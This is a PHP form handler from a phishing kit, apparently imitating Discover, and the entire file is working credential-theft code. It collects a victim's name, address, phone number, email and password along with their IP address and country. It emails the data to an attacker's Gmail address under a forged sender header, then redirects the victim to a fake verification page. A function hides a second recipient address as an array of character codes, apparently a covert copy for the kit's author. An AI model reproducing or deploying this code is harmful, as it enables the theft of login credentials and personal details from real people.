<?

$adddate=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$country = visitor_country();
$message .= "---------=Login Infor=---------\n";
$message .= "First Name: ".$_POST['formtext1']."\n";
$message .= "Last Name: ".$_POST['formtext2']."\n";
$message .= "Address: ".$_POST['formtext3']."\n";
$message .= "Address2: ".$_POST['formtext4']."\n";
$message .= "City: ".$_POST['formtext5']."\n";
$message .= "State: ".$_POST['formtext6']."\n";
$message .= "Zip Code: ".$_POST['formtext7']."\n";
$message .= "Contry : ".$_POST['formtext8']."\n";
$message .= "Phone: ".$_POST['formtext9']."\n";
$message .= "Email: ".$_POST['formtext10']."\n";
$message .= "Password: ".$_POST['formtext11']."\n";
$message .= "---------=IP Address & Date=---------\n";
$message .= "IP Address: ".$ip."\n";
$message .= "Country: ".$country."\n";
$message .= "Date: ".$adddate."\n";
$message .= "---------Created BY fudtools[.]com---------\n";
//Change Your Email Here :D
$sent ="fudtools@gmail.com";


$subject = "Discover - ".$country;
$headers = "From: Results Wire<wirez@googledocs.org>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
{
mail($mesaegs,$subject,$message,$headers);
mail($sent,$subject,$message,$headers);
}

// Function to get country and country sort;
function country_sort(){
	$sorter = "";
	$array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
$praga=rand();
$praga=md5($praga);
header("Location: verify.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");

?>